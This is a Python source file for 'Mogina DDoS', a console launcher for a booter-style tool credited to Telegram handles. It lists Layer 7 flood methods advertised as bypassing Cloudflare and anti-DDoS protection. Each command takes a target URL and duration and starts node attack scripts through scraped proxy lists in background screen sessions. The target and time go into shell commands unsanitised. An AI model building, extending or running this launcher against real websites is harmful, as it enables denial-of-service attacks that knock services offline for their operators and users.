import sys
import os
import getpass
import time
import socket

def clear():
    # Hàm để làm sạch màn hình (không chắc hoạt động trên tất cả các hệ điều hành)
    os.system('cls' if os.name == 'nt' else 'clear')

def title():
    print("\x1b]2;Mogina DDoS | Plant: [0$] | Zombies: [429] | Methods: [5] | Expiry: [1/1/2025] | Username: [FreeUser]\x07")

def logo():
    title()
    clear()
    print(f"""\033[37m                             ,MMM\033[35m8&&&.           
                  \033[37m      _...MMMMM\033[35m88&&&&..._     
                  \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.      
                  \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  
                  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
                  \033[37m     `''''MMMMM\033[35m88&&&&''''`
                  \033[37m           'MMM\033[35m8&&&'
                  
""")

def menu():
    clear()
    title()
    print(f"""\033[37m                             ,MMM\033[35m8&&&.           
                  \033[37m      _...MMMMM\033[35m88&&&&..._     
                  \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.      
                  \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  
                  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
                  \033[37m     `''''MMMMM\033[35m88&&&&''''`
                  \033[37m           'MMM\033[35m8&&&'
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
• PROXY | Premium proxies scraping | Tools
• METHODS | Available ddos methods | Menu
• HELP | This is display | Menu
• STOP | Stoped all attack in server | Tools
 ! If you want to use comments, use lowercase letters
""")

def ddos():
    clear()
    title()
    print(f"""\033[37m                             ,MMM\033[35m8&&&.           
                  \033[37m      _...MMMMM\033[35m88&&&&..._     
                  \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.      
                  \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  
                  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
                  \033[37m     `''''MMMMM\033[35m88&&&&''''`
                  \033[37m           'MMM\033[35m8&&&'
\033[1;35mMETHODS LAYER 7 LIST\033[0m

\033[1;37m.https-mixs   \033[0;32m[HTTPS]    \033[0;37mGood methods for attack website   \033[0;33m<BASIC>\033[0m
\033[1;37m.cfbypass     \033[0;32m[CFB]  \033[0;37mGood Bypass Cloudflare   \033[0;33m<BASIC>\033[0m
\033[1;37m.raw          \033[0;32m[RAW]    \033[0;37mHigh RPS and Good Bypass Normal   \033[0;33m<BASIC>\033[0m
\033[1;37m.uam          \033[0;32m[UAM]    \033[0;37mBypass HTTPDDOS And UAM CLOUDFLARE  \033[0;33m<VIP>\033[0m
\033[1;37m.browser      \033[0;32m[BROWSER]    \033[0;37mHigh RPS and Good Bypass All Antiddos  \033[0;33m<VIP>\033[0m

\033[1;35musage\033[0;37m: <method> <target> <time>
Example: methods https://website.com 60
""")

def account():
    print(f"""[0mID: [38;2;255;0;255m1[0m
[0mUsername: [38;2;255;0;255mFreeUser
[0mAdmin: false
[0mReseller: false
[0mVIP: true
[0mBypass Blacklist: true

[0mExpiry: [38;2;255;0;255m30[0m Day(s)
[0mMaxTime: [38;2;255;0;255m120 [0mSeconds
[0mCooldown: [38;2;255;0;255m60[0m Seconds
[0mConcurrents: [38;2;255;0;255m1[0m
[0mMax Sessions: [38;2;255;0;255m1[0m
[0mMy Attacks Sent: [38;2;255;0;255mUnknow[0m""")

def main():
    logo()
    while True:
        cnc = input(f"\033[0m\x1b[48;2;48;22;245mMogina \x1b[48;2;63;38;245m•\x1b[48;2;78;55;245m FreeUser\033[0m: ")
        if cnc.lower() == "methodss":
            ddos()
        elif cnc.lower() in ["clear", "cls"]:
            main()
        elif cnc.lower () in ["account", "Account"]:
           account()
        elif cnc.lower() == "help":
            menu()
        elif cnc.lower() == "methods":
            ddos()
        elif cnc.lower() == "stop":
            os.system('pkill screen')
            print("Stops All Attacks")
        elif cnc.lower() == "setup":
            os.system("python3 installer.py")
            print("Done")
        elif cnc.lower() == "proxy":
            os.system(f'cd Layer7 && python3 scrape.py')

        elif "https-mixs" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system(f'cd Layer7 && screen -dm node https-mixs {host} {attack_time} proxy.txt 5 32')
                title()
                print(f"""All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: https-mixs <url> <time>')
                print('Example: https-mixs http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "uam" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]               
                os.system(f'cd Layer7 && screen -dm node livex {host} {attack_time} 10 64 proxy.txt')
                title()
                print(f"""All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: uam <url> <time>')
                print('Example: uam http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "browser" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]                
                os.system(f'cd Layer7 && screen -dm node livex {host} {attack_time} 10 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node BROWSER {host} {attack_time} 32 8 proxy.txt')
                title()  # Sửa lại indent cho dòng này
                print(f""" All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: browser <url> <time>')
                print('Example: browser http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "cfbypass" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]               
                os.system(f'cd Layer7 && screen -dm node CFBYPASS {host} {attack_time} 32 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node livex {host} {attack_time} 10 64 proxy.txt')
                title()
                print(f"""All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: cfbypass <url> <time>')
                print('Example: cfbypass http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "raw" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system(f'cd Layer7 && screen -dm node raw {host} {attack_time}')
                title()
                print(f"""All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: raw <url> <time>')
                print('Example: raw http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif cnc.lower() == "credit":
            print("""[System] | Welcome ADMIN Mogina DDoS | Development By t.me/PhakeX2 | Ownered By t.me/linhcaptcha | Type [HELP]""")

        else:
            print(f"Command [{cnc}] Not Found. Type [HELP] to show commands.")

main()